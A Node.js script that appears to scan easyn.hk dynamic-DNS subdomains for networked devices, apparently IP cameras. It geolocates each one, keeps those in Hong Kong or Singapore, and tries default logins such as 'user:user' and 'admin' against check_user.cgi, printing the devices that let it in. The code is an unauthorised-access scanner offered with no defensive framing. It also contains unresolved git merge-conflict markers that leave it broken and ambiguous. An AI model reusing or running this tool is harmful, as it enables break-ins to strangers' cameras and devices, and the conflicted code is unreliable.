var request = require('request');
var winston = require('winston');
var sleep = require('sleep');
var satelize = require('satelize');

/*
var logger = new (winston.Logger)({
  transports: [
  	new (winston.transports.Console)(),
    new (winston.transports.File)({
      name: 'info',
      filename: './log/device.info.log',
      level: 'info'
    }),
    new (winston.transports.File)({
      name: 'error',
      filename: './log/device.error.log',
<<<<<<< HEAD
=======
      level: 'error'
>>>>>>> 857aeb2c57e3c0ba277137f32338ab98c8ac82b3
    })
  ]
});
*/

var url = '';

<<<<<<< HEAD
for(a=114 ; a<115 ; a++) {
=======
<<<<<<< HEAD
for(a=115 ; a<116 ; a++) {
	for(b=97 ; b<123 ; b++) {
		for(c=97 ; c<123 ; c++) {
			for(d=97 ; d<123 ; d++) {
				url = 'http://'+String.fromCharCode(a,b,c,d)+'.easyn.hk';
=======
for(a=116 ; a<117 ; a++) {
>>>>>>> 0f66ae36826c006a0e46610943cf6ae5890f5e81
	for(b=97 ; b<123 ; b++) {
		for(c=97 ; c<123 ; c++) {
			for(d=97 ; d<123 ; d++) {
				url = 'http://' + String.fromCharCode(a,b,c,d) + '.easyn.hk';
>>>>>>> 857aeb2c57e3c0ba277137f32338ab98c8ac82b3
				getLink(url);
                sleep.usleep(500);
			}
		}
	}
}

//url = 'http://002mhew.nwsvr.com';
//getLink(url);
function getLink(url) {
    //console.log(url);
	request({url: url, followRedirect : false}, function (error, response, body) {
		
		if (!error && response.statusCode == 302) {		
			//console.log('Get url : ' + response.headers['location']);
            checkCountry(url,response.headers['location']);
			//login(url,response.headers['location']);
		}
	});
}

//Check country
function checkCountry(url,link) {
    var ip = link.substr(7);
    if(ip.indexOf(':')) {
        ip = ip.substr(0,ip.indexOf(':'));
    }
    try {
    satelize.satelize({ip:ip}, function(err, payload) {
        try{
            if((payload.country_code == 'HK') || (payload.country_code == 'SG')) {
			    login(url,link); 
            }   
        }
        catch(err) {}
    });
    }
    catch(err) {}
}

function login(url,link) {
<<<<<<< HEAD
	link = 'http://user:user@' + link.substr(7) + '/check_user.cgi';
=======
	link = 'http://admin@' + link.substr(7) + '/check_user.cgi';
>>>>>>> 857aeb2c57e3c0ba277137f32338ab98c8ac82b3

    request({url: link}, function (error, response, body) {
    if (!error && response.statusCode == 200) {
        console.log(url);
    }
		
    });	
}
